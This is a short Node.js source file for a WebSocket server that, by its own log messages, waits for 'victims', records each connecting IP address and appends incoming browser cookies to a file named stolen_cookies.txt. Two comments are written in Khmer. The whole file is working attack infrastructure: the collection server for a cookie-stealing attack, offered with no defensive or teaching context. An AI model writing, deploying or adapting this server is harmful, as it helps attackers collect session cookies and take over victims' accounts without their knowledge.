// server.js - WebSocket Server
const WebSocket = require('ws');
const fs = require('fs');

const wss = new WebSocket.Server({ port: 8080 });

console.log('[+] WebSocket Server listening on port 8080');
console.log('[+] Waiting for victims...\n');

wss.on('connection', (ws, req) => {
    const ip = req.socket.remoteAddress;
    console.log(`[+] New connection from: ${ip}`);
    
    ws.on('message', (data) => {
        const timestamp = new Date().toISOString();
        console.log(`\n[${timestamp}] COOKIES RECEIVED:`);
        console.log('=' .repeat(50));
        console.log(data.toString());
        console.log('=' .repeat(50));
        
        // រក្សាទុកក្នុងឯកសារ
        fs.appendFileSync('stolen_cookies.txt', 
            `[${timestamp}] ${ip}\n${data.toString()}\n${'='.repeat(50)}\n`
        );
        
        // ផ្ញើការបញ្ជាក់
        ws.send('[+] Cookies received successfully!');
    });
});

console.log('[+] Server is running. Press Ctrl+C to stop');